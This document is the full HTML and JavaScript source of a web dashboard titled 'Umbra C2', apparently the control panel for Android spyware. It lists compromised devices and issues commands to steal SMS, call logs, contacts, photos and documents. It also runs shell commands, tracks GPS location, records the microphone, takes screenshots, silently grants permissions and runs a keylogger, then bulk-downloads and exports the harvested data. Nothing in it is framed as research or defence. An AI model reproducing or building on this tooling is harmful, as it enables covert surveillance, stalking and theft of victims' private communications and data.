<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Umbra C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#0a0e14;color:#c8d6e5;display:flex;height:100vh}
#sidebar{width:300px;background:#111820;padding:15px;overflow-y:auto;border-right:1px solid #1e2a3a;flex-shrink:0}
#main{flex:1;padding:15px;display:flex;flex-direction:column;gap:10px;min-width:0}
h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
.device{border:1px solid #1e2a3a;padding:10px;margin-bottom:6px;border-radius:4px;cursor:pointer}
.device:hover,.device.sel{border-color:#4da6ff}
.device.sel{background:#141f2e}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
.on{background:#3cc95b;box-shadow:0 0 6px #3cc95b}
.off{background:#f85149}
.id{font-size:12px;color:#4da6ff}
.info{font-size:11px;color:#5a6e82;margin-top:3px}
.btn{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:6px 14px;border-radius:4px;cursor:pointer;font-size:12px;font-family:monospace;margin:2px}
.btn:hover{background:#2ea043}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.btn.amber{background:#3a2a1a;border-color:#e0912e}
.btn.amber:hover{background:#e0912e}
.btn.red{background:#3a1a1a;border-color:#f85149}
.btn.red:hover{background:#f85149}
.btn.blue{background:#1a2a3a;border-color:#4da6ff}
.btn.blue:hover{background:#4da6ff}
#output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;min-height:120px}
#toolbar{display:flex;flex-wrap:wrap;gap:4px}
#keylog{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;min-height:120px;max-height:40vh}
.kl-line{border-bottom:1px solid #1e2a3a;padding:2px 0}
.kl-pkg{color:#4da6ff}
.kl-txt{color:#e6edf3}
.file-row{display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid #161d28}
.file-row .nm{flex:1;color:#c8d6e5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.file-row .sz{color:#5a6e82;font-size:11px}
.file-row button{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:2px 8px;border-radius:3px;cursor:pointer;font-size:11px;font-family:monospace}
.file-row button:hover{background:#2ea043}
img.preview{max-width:100%;max-height:400px;border:1px solid #1e2a3a;border-radius:4px;margin:6px 0}
a.dl{color:#4da6ff;text-decoration:underline;cursor:pointer}
.panel-label{font-size:11px;color:#5a6e82;margin:6px 0 2px}
.result-bar{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
audio{width:100%;margin:6px 0}
.export-bar{display:flex;gap:4px;flex-wrap:wrap;margin:4px 0}
.checkbox{display:flex;align-items:center;gap:4px;padding:2px 6px;font-size:11px;cursor:pointer}
.checkbox input{cursor:pointer}
</style>
</head>
<body>
<div id="sidebar">
  <h2>DEVICES <span id="devcount">(0)</span></h2>
  <div id="devlist">Loading...</div>
</div>
<div id="main">
  <div id="toolbar">
    <button class="btn" data-cmd="ping,ping">Ping</button>
    <button class="btn" data-cmd="info,gather">Info</button>
    <button class="btn" data-cmd="sms,list" data-params='{"count":"10"}'>SMS</button>
    <button class="btn" data-cmd="calls,list" data-params='{"count":"20"}'>Calls</button>
    <button class="btn" data-cmd="contacts,list">Contacts</button>
    <button class="btn" data-cmd="files,list" data-params='{"type":"images","count":"20"}'>Images</button>
    <button class="btn" data-cmd="files,list" data-params='{"type":"files","count":"20"}'>Docs</button>
    <button class="btn" data-cmd="shell,exec" data-params='{"cmd":"id"}'>Shell</button>
    <button class="btn" data-cmd="location,get">GPS</button>
    <button class="btn" data-cmd="mic,record" data-params='{"duration":"10"}'>Mic</button>
    <button class="btn" data-cmd="camera,screenshot">Screen</button>
    <button class="btn" data-cmd="silent_grant,grant">Grant</button>
  </div>
  <div id="ktoolbar">
    <button class="btn amber" data-cmd="keylog,start">Keylog Start</button>
    <button class="btn red" data-cmd="keylog,stop">Keylog Stop</button>
    <button class="btn" data-cmd="keylog,dump">Keylog Dump</button>
    <button class="btn" data-cmd="keylog,status">Keylog Status</button>
  </div>
  <div class="panel-label">KEYSTROKES (live)</div>
  <div id="keylog">Keylogger idle. Click "Keylog Start".</div>
  <div class="panel-label">RESULT</div>
  <div id="output">Waiting...</div>
</div>
<script>
var activeId = '';
var deviceData = {};
var lastListType = 'images';
var lastResult = null;       // raw parsed payload for export
var lastResultType = null;   // type string for export naming
var imageCache = [];         // accumulated image entries for bulk download

function esc(s){
  if(s===null||s===undefined) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function safeParse(s){ try{ return typeof s === 'string' ? JSON.parse(s) : s; }catch(e){ return null; } }

async function fetchDevs(){
  try{
    var r = await fetch('/api/devices');
    var d = await r.json();
    deviceData = {};
    (d.devices||[]).forEach(function(x){deviceData[x.id]=x;});
    if(!activeId || !deviceData[activeId]){
      activeId = '';
      for(var k in deviceData){if(deviceData[k].online){activeId=k;break;}}
      if(!activeId){ for(var k in deviceData){activeId=k;break;} }
    }
    renderSidebar();
  }catch(e){}
}

function renderSidebar(){
  document.getElementById('devcount').textContent = '('+Object.keys(deviceData).length+')';
  var html = '';
  for(var k in deviceData){
    var d = deviceData[k];
    html += '<div class="device'+(k===activeId?' sel':'')+'" onclick="select(\''+k+'\')">';
    html += '<span class="dot '+(d.online?'on':'off')+'"></span>';
    html += '<span class="id">'+esc(k.substring(0,16))+'...</span>';
    html += '<div class="info">'+esc(d.info.model||'?')+' | SDK '+esc(d.info.os_version||'?')+' | '+(d.online?'Online':'Offline')+'</div>';
    html += '</div>';
  }
  document.getElementById('devlist').innerHTML = html || 'No devices';
  var btns = document.querySelectorAll('.btn');
  for(var i=0;i<btns.length;i++) btns[i].disabled = !activeId;
}

function select(id){ activeId = id; renderSidebar(); }

async function sendCmd(mod, act, params){
  if(!activeId) return alert('No device selected');
  if(mod==='files' && act==='list' && params && params.type) lastListType = params.type;
  document.getElementById('output').textContent = 'Sending '+mod+'/'+act+'...';
  try{
    var r = await fetch('/api/command',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({device_id:activeId, module:mod, action:act, params:params||{}})
    });
    var d = await r.json();
    document.getElementById('output').textContent = 'Sent: '+mod+'/'+act+' ['+(d.command_id||'?')+']';
  }catch(e){
    document.getElementById('output').textContent = 'Error: '+e.message;
  }
}

// Wire buttons
document.querySelectorAll('.btn[data-cmd]').forEach(function(btn){
  btn.addEventListener('click', function(){
    var parts = this.dataset.cmd.split(',');
    var params = null;
    if(this.dataset.params) try{params=JSON.parse(this.dataset.params);}catch(e){}
    sendCmd(parts[0], parts[1], params);
  });
});

function humanSize(b){
  if(b===null||b===undefined) return '';
  if(b>1048576) return (b/1048576).toFixed(1)+' MB';
  if(b>1024) return (b/1024).toFixed(1)+' KB';
  return b+' B';
}

function timestampStr(){
  var d = new Date();
  return d.getFullYear()+pad(d.getMonth()+1)+pad(d.getDate())+'_'+pad(d.getHours())+pad(d.getMinutes())+pad(d.getSeconds());
}
function pad(n){ return n<10?'0'+n:''+n; }

// ── Export helpers ──────────────────────────────────────────────────────

function downloadBlob(blob, filename){
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url; a.download = filename;
  document.body.appendChild(a); a.click();
  document.body.removeChild(a);
  setTimeout(function(){ URL.revokeObjectURL(url); }, 5000);
}

function downloadDataUri(dataUri, filename){
  var a = document.createElement('a');
  a.href = dataUri; a.download = filename;
  document.body.appendChild(a); a.click();
  document.body.removeChild(a);
}

function downloadJSON(data, filename){
  downloadBlob(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}), filename);
}

function exportResult(){
  if(!lastResult){
    return alert('No data to export. Run a command first.');
  }
  var fn = (lastResultType||'result')+'_'+timestampStr()+'.json';
  downloadJSON(lastResult, fn);
}

// ── Bulk image download ─────────────────────────────────────────────────

async function downloadAllImages(){
  if(imageCache.length === 0){
    return alert('No images loaded. Click "Images" first.');
  }
  var out = document.getElementById('output');
  out.textContent = 'Downloading '+imageCache.length+' images...\n';

  var downloaded = 0;
  var failed = 0;

  for(var i=0; i<imageCache.length; i++){
    var entry = imageCache[i];
    out.textContent = 'Downloading '+(i+1)+'/'+imageCache.length+': '+entry.name+'\n';
    try{
      // Request the file content
      var r = await fetch('/api/command',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({device_id:activeId, module:'files', action:'read',
          params:{id:entry.id, type:lastListType, name:entry.name}})
      });
      var cmdResp = await r.json();
      var cmdId = cmdResp.command_id;

      // Wait for the result via polling SSE
      var result = await waitForResult(cmdId, 30000);
      if(result && result.payload && result.payload.base64_data){
        var mime = result.payload.mime_type || 'image/jpeg';
        var ext = mime.split('/')[1] || 'jpg';
        var dataUri = 'data:'+mime+';base64,'+result.payload.base64_data;
        downloadDataUri(dataUri, entry.name || ('image_'+entry.id+'.'+ext));
        downloaded++;
      } else {
        failed++;
      }
    }catch(e){
      failed++;
    }
    // Small delay between downloads to not overwhelm
    await new Promise(function(r){ setTimeout(r, 500); });
  }

  out.textContent += '\nDone: '+downloaded+' downloaded, '+failed+' failed';
}

// Wait for a specific command result via SSE
var sseResultWaiters = {};
function waitForResult(cmdId, timeoutMs){
  return new Promise(function(resolve){
    var timer = setTimeout(function(){
      delete sseResultWaiters[cmdId];
      resolve(null);
    }, timeoutMs);
    sseResultWaiters[cmdId] = function(env){
      clearTimeout(timer);
      delete sseResultWaiters[cmdId];
      resolve(env);
    };
  });
}

// ── Renderers ───────────────────────────────────────────────────────────

function renderExportBar(){
  return '<div class="export-bar">' +
    '<button class="btn blue" onclick="exportResult()">Export JSON</button>' +
    '</div>';
}

function renderFiles(entries, listType){
  var out = document.getElementById('output');
  imageCache = entries.slice(); // copy for bulk download

  var html = '<div class="result-bar"><b>Files ('+entries.length+')</b>';
  if(listType === 'images' && entries.length > 0){
    html += '<button class="btn blue" onclick="downloadAllImages()">Download All ('+entries.length+')</button>';
  }
  html += '<button class="btn blue" onclick="exportResult()">Export List JSON</button>';
  html += '</div>\n';

  entries.forEach(function(f){
    var id = esc(f.id);
    var nm = esc(f.name||'');
    html += '<div class="file-row">';
    html += '<span class="nm" title="'+esc(f.path||'')+'">'+nm+'</span>';
    html += '<span class="sz">'+humanSize(f.size)+'</span>';
    html += '<button onclick="readFile(\''+id+'\',\''+listType+'\',\''+nm.replace(/'/g,'\\\'')+'\')">view</button>';
    html += '</div>';
  });
  out.innerHTML = html;

  lastResult = {type:'file_list', entries:entries, list_type:listType};
  lastResultType = 'files_'+listType;
}

function readFile(id, type, name){
  sendCmd('files','read',{id:id, type:type, name:name});
}

function renderFileContent(p){
  var out = document.getElementById('output');
  var mime = p.mime_type||'application/octet-stream';
  var name = p.file_name||('file_'+p.file_id);
  var dataUri = 'data:'+mime+';base64,'+p.base64_data;

  var html = '<div class="result-bar"><b>'+esc(name)+'</b> <span class="sz">('+humanSize(p.size_bytes)+', '+esc(mime)+')</span></div>';
  html += '<div class="export-bar">';
  html += '<a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download</a>';
  html += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
  html += '</div>';

  if(mime.indexOf('image/')===0){
    html += '<img class="preview" src="'+dataUri+'" alt="'+esc(name)+'">';
  } else if(mime.indexOf('audio/')===0 || mime.indexOf('video/')===0 || name.match(/\.(m4a|mp3|mp4|aac|wav)$/i)){
    html += '<audio controls src="'+dataUri+'"></audio>';
  }
  out.innerHTML = html;

  lastResult = p;
  lastResultType = 'file_'+name;
}

function appendKeylog(p){
  var kl = document.getElementById('keylog');
  if(kl.textContent.indexOf('Keylogger idle')===0 || kl.textContent.indexOf('Keystrokes')===0){
    kl.textContent = '';
  }
  var div = document.createElement('div');
  div.className = 'kl-line';
  var ts = new Date().toLocaleTimeString();
  div.innerHTML = '<span class="kl-pkg">['+ts+' '+esc(p.package_name||p.keylog_package||'?')+']</span> <span class="kl-txt">'+esc(p.keylog_text||p.clipboard_text||'')+'</span>';
  kl.appendChild(div);
  kl.scrollTop = kl.scrollHeight;
}

// ── SSE ─────────────────────────────────────────────────────────────────

function sse(){
  var es = new EventSource('/api/events');
  es.onmessage = function(e){
    try{
      var r = JSON.parse(e.data);              // DashboardResult
      var env = safeParse(r.data);             // ResponseEnvelope (JSON string)
      var out = document.getElementById('output');
      if(!env){ return; }

      var p = env.payload || null;

      // Check if a waiter is registered for this command
      if(env.cmd_id && sseResultWaiters[env.cmd_id]){
        sseResultWaiters[env.cmd_id](env);
      }

      // Error envelope
      if(env.status === 'error' || (p && p.type === 'error')){
        out.textContent = 'Error: ' + ((p && p.error) || env.error || 'unknown');
        lastResult = env; lastResultType = 'error';
        return;
      }
      if(!p){ out.textContent = JSON.stringify(env,null,2); return; }

      switch(p.type){
        case 'file_list':
          renderFiles(p.entries||[], lastListType);
          break;
        case 'file_read':
          if(p.base64_data) renderFileContent(p);
          else out.textContent = 'File read empty: '+JSON.stringify(p,null,2);
          break;
        case 'keylog_dump':
          var kd = document.getElementById('keylog');
          kd.textContent = 'Keylog dump ('+p.count+'):\n';
          (p.keystrokes||[]).forEach(function(k){
            kd.textContent += '['+new Date(k.timestamp).toLocaleString()+'] '+k.package_name+': '+k.text+'\n';
          });
          lastResult = p; lastResultType = 'keylog_dump';
          out.innerHTML = '<div class="result-bar"><b>Keylog dump: '+p.count+' entries</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div>';
          break;
        case 'live_status':
          out.textContent = 'Status: '+p.status+' '+JSON.stringify(p.monitors||{});
          break;
        case 'live_event':
          if(p.event_type === 'keystroke'){
            appendKeylog(p);
          }else{
            out.textContent = 'Event: '+JSON.stringify(p,null,2);
          }
          break;
        case 'sms_list':
          lastResult = p; lastResultType = 'sms';
          var smsHtml = '<div class="result-bar"><b>SMS ('+p.count+')</b>';
          smsHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
          smsHtml += '</div>\n';
          smsHtml += '<pre>'+esc(JSON.stringify(p.messages,null,2))+'</pre>';
          out.innerHTML = smsHtml;
          break;
        case 'contacts_list':
          lastResult = p; lastResultType = 'contacts';
          var contactsHtml = '<div class="result-bar"><b>Contacts ('+p.count+')</b>';
          contactsHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
          contactsHtml += '</div>\n';
          contactsHtml += '<pre>'+esc(JSON.stringify(p.contacts,null,2))+'</pre>';
          out.innerHTML = contactsHtml;
          break;
        case 'calls_list':
          lastResult = p; lastResultType = 'calls';
          var callsHtml = '<div class="result-bar"><b>Calls ('+p.count+')</b>';
          callsHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
          callsHtml += '</div>\n';
          callsHtml += '<pre>'+esc(JSON.stringify(p.calls,null,2))+'</pre>';
          out.innerHTML = callsHtml;
          break;
        case 'shell':
          lastResult = p; lastResultType = 'shell';
          out.innerHTML = '<div class="result-bar"><b>Shell</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div><pre>'+esc(p.stdout||'')+(p.stderr?'\nSTDERR:\n'+esc(p.stderr):'')+'</pre>';
          break;
        case 'device_info':
          lastResult = p; lastResultType = 'device_info';
          out.innerHTML = '<div class="result-bar"><b>Device Info</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div><pre>'+esc(JSON.stringify(p,null,2))+'</pre>';
          break;
        case 'mic_recording':
          lastResult = p; lastResultType = 'mic';
          var mime = p.format === 'M4A' ? 'audio/mp4' : (p.format === 'MP3' ? 'audio/mpeg' : 'audio/aac');
          var audioUri = 'data:'+mime+';base64,'+p.audio_base64;
          var micHtml = '<div class="result-bar"><b>Mic Recording</b> '+p.duration_seconds+'s, '+humanSize(p.size_bytes)+', '+esc(p.format||'AAC')+'</div>';
          micHtml += '<div class="export-bar">';
          micHtml += '<a class="dl" href="'+audioUri+'" download="mic_'+timestampStr()+'.'+(p.format||'aac').toLowerCase()+'">Download audio</a>';
          micHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
          micHtml += '</div>';
          micHtml += '<audio controls src="'+audioUri+'"></audio>';
          out.innerHTML = micHtml;
          break;
        case 'screenshot':
        case 'camera':
          lastResult = p; lastResultType = p.type;
          if(p.image_base64){
            var imgMime = 'image/'+(p.format||'png').toLowerCase();
            var imgUri = 'data:'+imgMime+';base64,'+p.image_base64;
            var imgHtml = '<div class="result-bar"><b>'+(p.type==='screenshot'?'Screenshot':'Camera')+'</b></div>';
            imgHtml += '<div class="export-bar">';
            imgHtml += '<a class="dl" href="'+imgUri+'" download="'+p.type+'_'+timestampStr()+'.'+(p.format||'png').toLowerCase()+'">Download image</a>';
            imgHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
            imgHtml += '</div>';
            imgHtml += '<img class="preview" src="'+imgUri+'" alt="capture">';
            out.innerHTML = imgHtml;
          }else{
            out.textContent = JSON.stringify(p,null,2);
          }
          break;
        case 'location':
          lastResult = p; lastResultType = 'location';
          var locHtml = '<div class="result-bar"><b>Location</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div>';
          if(p.latitude && p.longitude){
            locHtml += '<pre>Lat: '+p.latitude+'\nLon: '+p.longitude+'\nAccuracy: '+(p.accuracy||'?')+'m\nTime: '+(p.timestamp||'?')+'</pre>';
            locHtml += '<a class="dl" href="https://maps.google.com/?q='+p.latitude+','+p.longitude+'" target="_blank">Open in Google Maps</a>';
          }else{
            locHtml += '<pre>'+esc(JSON.stringify(p,null,2))+'</pre>';
          }
          out.innerHTML = locHtml;
          break;
        default:
          lastResult = p; lastResultType = p.type||'unknown';
          out.innerHTML = '<div class="result-bar"><b>'+esc(p.type||'Result')+'</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div><pre>'+esc(JSON.stringify(p,null,2))+'</pre>';
      }
    }catch(ex){}
  };
  es.onerror = function(){ setTimeout(sse,2000); };
}

fetchDevs();
setInterval(fetchDevs,3000);
sse();
</script>
</body>
</html>
